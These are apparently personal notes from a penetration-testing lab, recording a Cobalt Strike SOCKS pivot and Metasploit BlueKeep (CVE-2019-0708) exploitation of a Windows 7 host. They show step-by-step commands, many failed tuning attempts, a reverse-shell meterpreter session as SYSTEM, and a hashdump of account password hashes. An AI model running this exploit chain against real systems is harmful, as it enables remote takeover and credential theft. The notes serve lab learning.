link return:
[[CVE-2019-0708 Blue Keep]]

```
CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check
```
On ms01 `beacon` setup proxy server on port 2222
![[Penetration Testing v2/htb_pro_Labs/offshore/2. 172.16.1.30 - CORP-MS01/screenshots/Pasted image 20231026140208.png]]
Modify `vim /etc/proxychains4.conf`
![[Penetration Testing v2/htb_pro_Labs/offshore/2. 172.16.1.30 - CORP-MS01/screenshots/Pasted image 20231026140330.png]]
in `cobaltstrike` click tunnel on proxy to get command to use on meterpreter to utilize the socks tunnel
![[Penetration Testing v2/htb_pro_Labs/offshore/2. 172.16.1.30 - CORP-MS01/screenshots/Pasted image 20231026140442.png]]
utilize command `setg Proxies socks5:127.0.0.1:2222` as first command in `msfconsole`
search `blue keep`
```bash
msf6 post(multi/recon/local_exploit_suggester) > search blue keep           

Matching Modules                                                            
================                      
                                      
   #  Name                                            Disclosure Date  Rank    Check  Description                                                       
   -  ----                                            ---------------  ----    -----  -----------                                                       
   0  auxiliary/scanner/rdp/cve_2019_0708_bluekeep    2019-05-14       normal  Yes    CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check         
   1  exploit/windows/rdp/cve_2019_0708_bluekeep_rce  2019-05-14       manual  Yes    CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free  
```
`use 0`
`show options`
```bash
msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > show options                                                                                       
                                                                            
Module options (auxiliary/scanner/rdp/cve_2019_0708_bluekeep):              
                                                                            
   Name             Current Setting  Required  Description                  
   ----             ---------------  --------  -----------                  
   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect                                                         
   RDP_CLIENT_NAME  rdesktop         no        The client computer name to report during connect, UNSET = random                                        
   RDP_DOMAIN                        no        The client domain name to report during connect                                                          
   RDP_USER                          no        The username to report during connect, UNSET = random                                                    
   RHOSTS                            yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html   
   RPORT            3389             yes       The target port (TCP)
   THREADS          1                yes       The number of concurrent threads (max one per host)                                                      
```
`set rhosts 172.16.1.101`
`set RDP_CLIENT_IP 172.16.1.101`
`run`
```BASH
msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > set rhosts 172.16.1.101
rhosts => 172.16.1.101
msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > set RDP_CLIENT_IP 172.16.1.101
RDP_CLIENT_IP => 172.16.1.101
msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > run

[+] 172.16.1.101:3389     - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > 
```

###### Blue Keep Setup & Throw

`search blue keep`
`use 1`
```bash
msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > search blue keep

Matching Modules                                                            
================                                                            
                                                                                                                                                        
   #  Name                                            Disclosure Date  Rank    Check  Description
   -  ----                                            ---------------  ----    -----  -----------
   0  auxiliary/scanner/rdp/cve_2019_0708_bluekeep    2019-05-14       normal  Yes    CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check
   1  exploit/windows/rdp/cve_2019_0708_bluekeep_rce  2019-05-14       manual  Yes    CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free
                                      

Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
                                      
msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > use 1
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp 
```
`show options`
```
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > show options

Module options (exploit/windows/rdp/cve_2019_0708_bluekeep_rce):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect
   RDP_CLIENT_NAME  ethdev           no        The client computer name to report during connect, UNSET = random
   RDP_DOMAIN                        no        The client domain name to report during connect
   RDP_USER                          no        The username to report during connect, UNSET = random
   RHOSTS                            yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT            3389             yes       The target port (TCP)


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.146.129  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic targeting via fingerprinting



View the full module info with the info, or info -d command.


```
`set rhosts 172.16.1.101`  
`set RDP_CLIENT_IP 172.16.1.101`
`set lhost 10.10.14.39`
Completed options
```bash
   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   RDP_CLIENT_IP    172.16.1.101     yes       The client IPv4 address to report during connect
   RDP_CLIENT_NAME  ethdev           no        The client computer name to report during connect, UNSET = random
   RDP_DOMAIN                        no        The client domain name to report during connect
   RDP_USER                          no        The username to report during connect, UNSET = random
   RHOSTS           172.16.1.101     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT            3389             yes       The target port (TCP)


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.39      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```
`set target 8`
- tried twice so far - most success i've had
```bash
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run                                                                                              
                                                                                                                                                        
[*] Started reverse TCP handler on 10.10.14.39:8443                                                                                                     
[*] 172.16.1.101:3389 - Running automatic check ("set AutoCheck false" to disable)                                 
[*] 172.16.1.101:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check                
[+] 172.16.1.101:3389     - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389     - Scanned 1 of 1 hosts (100% complete)                                                                                        
[+] 172.16.1.101:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8013e28000, Channel count 1.                                
[!] 172.16.1.101:3389 - <---------------- | Entering Danger Zone | ---------------->                                                                    
[*] 172.16.1.101:3389 - Surfing channels ...                                                                                                            
[*] 172.16.1.101:3389 - Lobbing eggs ...                                                                                                                
[*] 172.16.1.101:3389 - Forcing the USE of FREE'd object ...                                                                                            
[!] 172.16.1.101:3389 - <---------------- | Leaving Danger Zone | ---------------->                              
[*] Exploit completed, but no session was created.       
```
`set target 7`
- takes around 8 minutes to complete each time...
```bash
^Cmsf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run

[*] Started reverse TCP handler on 10.10.14.39:8443 
[*] 172.16.1.101:3389 - Running automatic check ("set AutoCheck false" to disable)
[*] 172.16.1.101:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
[+] 172.16.1.101:3389     - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389     - Scanned 1 of 1 hosts (100% complete)
[+] 172.16.1.101:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8028608000, Channel count 1.
[!] 172.16.1.101:3389 - <---------------- | Entering Danger Zone | ---------------->
[*] 172.16.1.101:3389 - Surfing channels ...
[*] 172.16.1.101:3389 - Lobbing eggs ...
[*] 172.16.1.101:3389 - Forcing the USE of FREE'd object ...
[!] 172.16.1.101:3389 - <---------------- | Leaving Danger Zone | ---------------->
[*] Exploit completed, but no session was created.
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > 

```
`set target 6`
`run`
```bash
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set target 6
target => 6
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run

[*] Started reverse TCP handler on 10.10.14.39:8443 
[*] 172.16.1.101:3389 - Running automatic check ("set AutoCheck false" to disable)
[*] 172.16.1.101:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
[+] 172.16.1.101:3389     - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389     - Scanned 1 of 1 hosts (100% complete)
[+] 172.16.1.101:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8111e07000, Channel count 1.
[!] 172.16.1.101:3389 - <---------------- | Entering Danger Zone | ---------------->
[*] 172.16.1.101:3389 - Surfing channels ...
[*] 172.16.1.101:3389 - Lobbing eggs ...
[*] 172.16.1.101:3389 - Forcing the USE of FREE'd object ...
[!] 172.16.1.101:3389 - <---------------- | Leaving Danger Zone | ---------------->
[*] Exploit completed, but no session was created.
```
`set target 5`
`run`
```bash
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set target 5
target => 5
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run

[*] Started reverse TCP handler on 10.10.14.39:8443 
[*] 172.16.1.101:3389 - Running automatic check ("set AutoCheck false" to disable)
[*] 172.16.1.101:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
[+] 172.16.1.101:3389     - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389     - Scanned 1 of 1 hosts (100% complete)
[+] 172.16.1.101:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8028608000, Channel count 1.
[!] 172.16.1.101:3389 - <---------------- | Entering Danger Zone | ---------------->
[*] 172.16.1.101:3389 - Surfing channels ...
[*] 172.16.1.101:3389 - Lobbing eggs ...
[*] 172.16.1.101:3389 - Forcing the USE of FREE'd object ...
[!] 172.16.1.101:3389 - <---------------- | Leaving Danger Zone | ---------------->
[*] Exploit completed, but no session was created.
```
`set target 1
`run`
```bash
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set target 5
target => 5
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run

[*] Started reverse TCP handler on 10.10.14.39:8443 
[*] 172.16.1.101:3389 - Running automatic check ("set AutoCheck false" to disable)
[*] 172.16.1.101:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
[+] 172.16.1.101:3389     - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389     - Scanned 1 of 1 hosts (100% complete)
[+] 172.16.1.101:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8028608000, Channel count 1.
[!] 172.16.1.101:3389 - <---------------- | Entering Danger Zone | ---------------->
[*] 172.16.1.101:3389 - Surfing channels ...
[*] 172.16.1.101:3389 - Lobbing eggs ...
[*] 172.16.1.101:3389 - Forcing the USE of FREE'd object ...
[!] 172.16.1.101:3389 - <---------------- | Leaving Danger Zone | ---------------->
[*] Exploit completed, but no session was created.
```


#### Modifying Groomsize 50
Groom Size modification Links:
https://github.com/rapid7/metasploit-framework/issues/13732

saved original before modifications here.
Groom Size modification Links:
![[Penetration Testing v2/htb_pro_Labs/offshore/2. 172.16.1.30 - CORP-MS01/screenshots/Pasted image 20231027123231.png]]

`set target 1`
```bash
=================

    Id  Name
    --  ----
    0   Automatic targeting via fingerprinting
=>  1   Windows 7 SP1 / 2008 R2 (6.1.7601 x64)
    2   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox 6)
    3   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 14)
    4   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15)
    5   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)
    6   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)
    7   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - AWS)
    8   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - QEMU/KVM)


msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run

[*] Started reverse TCP handler on 10.10.14.39:8443 
[*] 172.16.1.101:3389 - Running automatic check ("set AutoCheck false" to disable)
[*] 172.16.1.101:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
[+] 172.16.1.101:3389     - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389     - Scanned 1 of 1 hosts (100% complete)
[+] 172.16.1.101:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8013200000, Channel count 1.
[!] 172.16.1.101:3389 - <---------------- | Entering Danger Zone | ---------------->
[*] 172.16.1.101:3389 - Surfing channels ...
[*] 172.16.1.101:3389 - Lobbing eggs ...
[*] 172.16.1.101:3389 - Forcing the USE of FREE'd object ...
[!] 172.16.1.101:3389 - <---------------- | Leaving Danger Zone | ---------------->
[*] Exploit completed, but no session was created.
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > 
```
Going to attempt to modify groom size now - set it to 50 - Going to try against all targets at 50
`set GROOMSIZE 50`
`show advanced`
```bash
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set GROOMSIZE 50                                                                                 
GROOMSIZE => 50                                                                                                                                         
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > show advanced                                                                                    
                                                                                                                                                        
Module advanced options (exploit/windows/rdp/cve_2019_0708_bluekeep_rce):                                                                               
                                                                                                                                                        
   Name                     Current Setting                          Required  Description                                                              
   ----                     ---------------                          --------  -----------                                                              
   AutoCheck                true                                     no        Run check before exploit                                                 
   CHOST                                                             no        The local client address                                                 
   CPORT                                                             no        The local client port                                                    
   CheckModule              auxiliary/scanner/rdp/cve_2019_0708_blu  yes       Module to check with                                                     
                            ekeep                                                                                                                       
   ConnectTimeout           10                                       yes       Maximum number of seconds to establish a TCP connection
   ContextInformationFile                                            no        The information file that contains context information
   DisablePayloadHandler    false                                    no        Disable the handler code for the selected payload               
   EnableContextEncoding    false                                    no        Use transient context when encoding payloads      
   ForceExploit             true                                     no        Override check result                             
   GROOMCHANNEL             RDPSND                                   yes       Channel to use for grooming (Accepted: RDPSND, MS_T120)
   GROOMCHANNELCOUNT        1                                        yes       Number of channels to groom                             
   GROOMDELAY               0                                        no        Delay in seconds between sending 1 MB of groom packets
   GROOMSIZE                50                                       yes       Size of the groom in MB
   Proxies                  socks5:127.0.0.1:2222                    no        A proxy chain of format type:host:port[,type:host:port][...]           
```
Target 1 `GROOMSIZE 50MB` 
```bash
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run

[*] Started reverse TCP handler on 10.10.14.39:8443 
[*] 172.16.1.101:3389 - Running automatic check ("set AutoCheck false" to disable)
[*] 172.16.1.101:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
[+] 172.16.1.101:3389     - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389     - Scanned 1 of 1 hosts (100% complete)
[+] 172.16.1.101:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389 - Using CHUNK grooming strategy. Size 50MB, target address 0xfffffa8006a00000, Channel count 1.
[!] 172.16.1.101:3389 - <---------------- | Entering Danger Zone | ---------------->
[*] 172.16.1.101:3389 - Surfing channels ...
[*] 172.16.1.101:3389 - Lobbing eggs ...
[*] 172.16.1.101:3389 - Forcing the USE of FREE'd object ...
[!] 172.16.1.101:3389 - <---------------- | Leaving Danger Zone | ---------------->
[*] Exploit completed, but no session was created.
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > 

```
Target 2 `GROOMSIZE 50`
```bash
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set target 2
target => 2
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run

[*] Started reverse TCP handler on 10.10.14.39:8443 
[*] 172.16.1.101:3389 - Running automatic check ("set AutoCheck false" to disable)
[*] 172.16.1.101:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
[+] 172.16.1.101:3389     - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389     - Scanned 1 of 1 hosts (100% complete)
[+] 172.16.1.101:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389 - Using CHUNK grooming strategy. Size 50MB, target address 0xfffffa8005607000, Channel count 1.
[!] 172.16.1.101:3389 - <---------------- | Entering Danger Zone | ---------------->
[*] 172.16.1.101:3389 - Surfing channels ...
[*] 172.16.1.101:3389 - Lobbing eggs ...
[*] 172.16.1.101:3389 - Forcing the USE of FREE'd object ...
[!] 172.16.1.101:3389 - <---------------- | Leaving Danger Zone | ---------------->
[*] Exploit completed, but no session was created.
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > 
```
Target 3 `GROOMSIZE 50`
```bash
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set target 3
target => 3
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run

[*] Started reverse TCP handler on 10.10.14.39:8443 
[*] 172.16.1.101:3389 - Running automatic check ("set AutoCheck false" to disable)
[*] 172.16.1.101:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
[+] 172.16.1.101:3389     - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389     - Scanned 1 of 1 hosts (100% complete)
[+] 172.16.1.101:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389 - Using CHUNK grooming strategy. Size 50MB, target address 0xfffffa8033e00000, Channel count 1.
[!] 172.16.1.101:3389 - <---------------- | Entering Danger Zone | ---------------->
[*] 172.16.1.101:3389 - Surfing channels ...
[*] 172.16.1.101:3389 - Lobbing eggs ...
[*] 172.16.1.101:3389 - Forcing the USE of FREE'd object ...
[!] 172.16.1.101:3389 - <---------------- | Leaving Danger Zone | ---------------->
[*] Exploit completed, but no session was created.
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > 
```
Target 4 `GROOMSIZE 50`
```bash
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set target 4
target => 4
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run

[*] Started reverse TCP handler on 10.10.14.39:8443 
[*] 172.16.1.101:3389 - Running automatic check ("set AutoCheck false" to disable)
[*] 172.16.1.101:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
[+] 172.16.1.101:3389     - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389     - Scanned 1 of 1 hosts (100% complete)
[+] 172.16.1.101:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389 - Using CHUNK grooming strategy. Size 50MB, target address 0xfffffa801be00000, Channel count 1.
[!] 172.16.1.101:3389 - <---------------- | Entering Danger Zone | ---------------->
[*] 172.16.1.101:3389 - Surfing channels ...
[*] 172.16.1.101:3389 - Lobbing eggs ...
[*] 172.16.1.101:3389 - Forcing the USE of FREE'd object ...
[!] 172.16.1.101:3389 - <---------------- | Leaving Danger Zone | ---------------->
[*] Exploit completed, but no session was created.
```
Target 5 `GROOMSIZE 50`
```bash
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set target 5
target => 5
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run

[*] Started reverse TCP handler on 10.10.14.39:8443 
[*] 172.16.1.101:3389 - Running automatic check ("set AutoCheck false" to disable)
[*] 172.16.1.101:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
[+] 172.16.1.101:3389     - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389     - Scanned 1 of 1 hosts (100% complete)
[+] 172.16.1.101:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389 - Using CHUNK grooming strategy. Size 50MB, target address 0xfffffa801be08000, Channel count 1.
[!] 172.16.1.101:3389 - <---------------- | Entering Danger Zone | ---------------->
[*] 172.16.1.101:3389 - Surfing channels ...
[*] 172.16.1.101:3389 - Lobbing eggs ...
[*] 172.16.1.101:3389 - Forcing the USE of FREE'd object ...
[!] 172.16.1.101:3389 - <---------------- | Leaving Danger Zone | ---------------->
[*] Exploit completed, but no session was created.
```
target 6 `GROOMSIZE 50`
```bash
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set target 6
target => 6
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run

[*] Started reverse TCP handler on 10.10.14.39:8443 
[*] 172.16.1.101:3389 - Running automatic check ("set AutoCheck false" to disable)
[*] 172.16.1.101:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
[+] 172.16.1.101:3389     - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389     - Scanned 1 of 1 hosts (100% complete)
[+] 172.16.1.101:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389 - Using CHUNK grooming strategy. Size 50MB, target address 0xfffffa8105607000, Channel count 1.
[!] 172.16.1.101:3389 - <---------------- | Entering Danger Zone | ---------------->
[*] 172.16.1.101:3389 - Surfing channels ...
[*] 172.16.1.101:3389 - Lobbing eggs ...
[*] 172.16.1.101:3389 - Forcing the USE of FREE'd object ...
[!] 172.16.1.101:3389 - <---------------- | Leaving Danger Zone | ---------------->
[*] Exploit completed, but no session was created.
```
target 7 `GROOMSIZE 50`
```bash
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set target 7
target => 7
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run

[*] Started reverse TCP handler on 10.10.14.39:8443 
[*] 172.16.1.101:3389 - Running automatic check ("set AutoCheck false" to disable)
[*] 172.16.1.101:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
[+] 172.16.1.101:3389     - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389     - Scanned 1 of 1 hosts (100% complete)
[+] 172.16.1.101:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389 - Using CHUNK grooming strategy. Size 50MB, target address 0xfffffa801be08000, Channel count 1.
[!] 172.16.1.101:3389 - <---------------- | Entering Danger Zone | ---------------->
[*] 172.16.1.101:3389 - Surfing channels ...
[*] 172.16.1.101:3389 - Lobbing eggs ...
[*] 172.16.1.101:3389 - Forcing the USE of FREE'd object ...
[!] 172.16.1.101:3389 - <---------------- | Leaving Danger Zone | ---------------->
[*] Exploit completed, but no session was created.
```
target 8 `GROOMSIZE 50`
```bash
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set target 8
target => 8
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run

[*] Started reverse TCP handler on 10.10.14.39:8443 
[*] 172.16.1.101:3389 - Running automatic check ("set AutoCheck false" to disable)
[*] 172.16.1.101:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
[*] 172.16.1.101:3389     - Scanned 1 of 1 hosts (100% complete)
[!] 172.16.1.101:3389 - Cannot reliably check exploitability. ForceExploit is enabled, proceeding with exploitation.
[*] 172.16.1.101:3389 - Using CHUNK grooming strategy. Size 50MB, target address 0xfffffa8007628000, Channel count 1.
[!] 172.16.1.101:3389 - <---------------- | Entering Danger Zone | ---------------->
[*] 172.16.1.101:3389 - Surfing channels ...
[*] 172.16.1.101:3389 - Lobbing eggs ...
[*] 172.16.1.101:3389 - Forcing the USE of FREE'd object ...
[!] 172.16.1.101:3389 - <---------------- | Leaving Danger Zone | ---------------->
[*] Exploit completed, but no session was created.
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > 

```

#### Groomsize 100
`set GROOMSIZE 100`
`set target 1`
`TAKES MULTIPLE ATTEMPTS
````bash
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set GROOMSIZE 100
GROOMSIZE => 100
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set target 1
target => 1
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run

[*] Started reverse TCP handler on 10.10.14.39:8443 
[*] 172.16.1.101:3389 - Running automatic check ("set AutoCheck false" to disable)
[*] 172.16.1.101:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
[+] 172.16.1.101:3389     - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389     - Scanned 1 of 1 hosts (100% complete)
[+] 172.16.1.101:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389 - Using CHUNK grooming strategy. Size 100MB, target address 0xfffffa8009c00000, Channel count 1.
[!] 172.16.1.101:3389 - <---------------- | Entering Danger Zone | ---------------->
[*] 172.16.1.101:3389 - Surfing channels ...
[*] 172.16.1.101:3389 - Lobbing eggs ...
[*] 172.16.1.101:3389 - Forcing the USE of FREE'd object ...
[!] 172.16.1.101:3389 - <---------------- | Leaving Danger Zone | ---------------->
[*] Sending stage (200774 bytes) to 10.10.110.3
[*] Meterpreter session 1 opened (10.10.14.39:8443 -> 10.10.110.3:37353) at 2023-10-27 13:08:19 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
justalocaladmin:1002:aad3b435b51404eeaad3b435b51404ee:ab781997e9dbe109dd334ec46599c193:::

```

```